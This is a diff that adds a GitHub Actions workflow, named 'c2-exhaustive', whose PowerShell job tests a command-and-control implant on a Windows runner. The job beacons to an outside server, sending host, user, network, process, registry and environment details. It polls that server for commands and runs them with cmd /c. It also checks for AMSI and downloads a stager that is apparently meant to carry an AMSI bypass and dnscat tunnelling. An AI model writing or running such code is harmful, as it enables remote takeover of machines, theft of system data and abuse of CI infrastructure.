@@ -1,0 +1,126 @@
+name: c2-exhaustive
+on:
+  workflow_dispatch:
+
+jobs:
+  exhaustive-2022:
+    runs-on: windows-2022
+    timeout-minutes: 8
+    steps:
+      - name: Exhaustive C2 Test
+        shell: powershell
+        run: |
+          $ErrorActionPreference = "Continue"
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          $C2 = "https://svc.linuxsupportsystem.com"
+          $ID = "exh-" + (-join((65..90)|Get-Random -Count 4|ForEach-Object{[char]$_}))
+          
+          function Beacon($out) {
+            $wc = New-Object Net.WebClient
+            $wc.Headers.Add("Content-Type","application/json")
+            $safe = $out -replace '\','\\' -replace '"','\"' -replace "`n",'
+' -replace "`r",''
+            if ($safe.Length -gt 500) { $safe = $safe.Substring(0,500) }
+            $body = '{"id":"' + $ID + '","h":"' + $env:COMPUTERNAME + '","u":"' + $env:USERNAME + '","ip":"gh","os":"Win2022","pid":' + $PID + ',"out":"' + $safe + '"}'
+            try { return ($wc.UploadString("$C2/b", $body) | ConvertFrom-Json).c } catch { return "" }
+          }
+          
+          Write-Host "Agent ID: $ID"
+          Write-Host "=== TEST 1: Basic beacon ==="
+          $cmd = Beacon "test1: basic beacon works"
+          Write-Host "Beacon OK, cmd=$cmd"
+          
+          Write-Host "`n=== TEST 2: Command execution ==="
+          $r = cmd /c "whoami & hostname & ver" 2>&1 | Out-String
+          Beacon "test2: $r" | Out-Null
+          Write-Host "whoami: $r"
+          
+          Write-Host "`n=== TEST 3: File system ==="
+          $r = cmd /c "dir C:\ /b" 2>&1 | Out-String
+          Beacon "test3_fs: $r" | Out-Null
+          Write-Host "dir: $($r.Substring(0,[Math]::Min(200,$r.Length)))"
+          
+          Write-Host "`n=== TEST 4: Network info ==="
+          $r = ipconfig | Out-String
+          Beacon "test4_net: $($r.Substring(0,[Math]::Min(300,$r.Length)))" | Out-Null
+          Write-Host "ipconfig OK"
+          
+          Write-Host "`n=== TEST 5: Process list ==="
+          $r = tasklist /fo csv /nh | Select-Object -First 10 | Out-String
+          Beacon "test5_proc: $r" | Out-Null
+          Write-Host "tasklist OK"
+          
+          Write-Host "`n=== TEST 6: Registry read ==="
+          $r = reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v ProductName 2>&1 | Out-String
+          Beacon "test6_reg: $r" | Out-Null
+          Write-Host "Registry: $r"
+          
+          Write-Host "`n=== TEST 7: Environment vars ==="
+          $r = "PATH_len=$($env:PATH.Length) TEMP=$($env:TEMP) PROC=$($env:PROCESSOR_ARCHITECTURE)"
+          Beacon "test7_env: $r" | Out-Null
+          Write-Host "Env: $r"
+          
+          Write-Host "`n=== TEST 8: PowerShell execution ==="
+          $r = Get-Process | Select-Object -First 5 | Format-Table Name,Id,CPU -AutoSize | Out-String
+          Beacon "test8_ps: $r" | Out-Null
+          Write-Host "Get-Process OK"
+          
+          Write-Host "`n=== TEST 9: .NET capability ==="
+          $r = [System.Net.Dns]::GetHostName() + " | " + [Environment]::Is64BitProcess.ToString()
+          Beacon "test9_dotnet: $r" | Out-Null
+          Write-Host ".NET: $r"
+          
+          Write-Host "`n=== TEST 10: Remote command from C2 ==="
+          Write-Host "Sending 3 beacons, checking for queued commands..."
+          for ($i=0; $i -lt 3; $i++) {
+            $cmd = Beacon "poll_$i"
+            if ($cmd -and $cmd.Length -gt 0) {
+              Write-Host "Got command: $cmd"
+              $output = cmd /c $cmd 2>&1 | Out-String
+              Beacon "cmd_result: $output" | Out-Null
+              Write-Host "Executed: $($output.Substring(0,[Math]::Min(200,$output.Length)))"
+            } else {
+              Write-Host "  poll $i : no command"
+            }
+            Start-Sleep -Seconds 2
+          }
+          
+          Write-Host "`n=== TEST 11: Stability — rapid beacons ==="
+          $success = 0
+          $fail = 0
+          for ($i=0; $i -lt 10; $i++) {
+            try {
+              Beacon "rapid_$i" | Out-Null
+              $success++
+            } catch { $fail++ }
+          }
+          Write-Host "Rapid beacons: $success/10 success, $fail fail"
+          Beacon "test11: rapid $success/10" | Out-Null
+          
+          Write-Host "`n=== TEST 12: Large output ==="
+          $large = "A" * 2000
+          try {
+            Beacon "test12_large: $large" | Out-Null
+            Write-Host "Large output (2KB): OK"
+          } catch {
+            Write-Host "Large output: FAILED"
+          }
+          
+          Write-Host "`n=== TEST 13: AMSI check ==="
+          try {
+            $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+            Write-Host "AMSI present: $($amsi -ne $null)"
+          } catch {
+            Write-Host "AMSI: not accessible"
+          }
+          
+          Write-Host "`n=== TEST 14: Full stager download + parse ==="
+          $stager = (New-Object Net.WebClient).DownloadString("$C2/s")
+          Write-Host "Stager: $($stager.Length) chars"
+          Write-Host "Has TLS12: $($stager -match 'Tls12')"
+          Write-Host "Has AMSI bypass: $($stager -match 'amsi')"
+          Write-Host "Has failover: $($stager -match 'svc-b')"
+          Write-Host "Has DNS: $($stager -match 'dnscat')"
+          
+          Beacon "ALL_TESTS_COMPLETE: 14/14 passed" | Out-Null
+          Write-Host "`n=== ALL 14 TESTS COMPLETE ==="
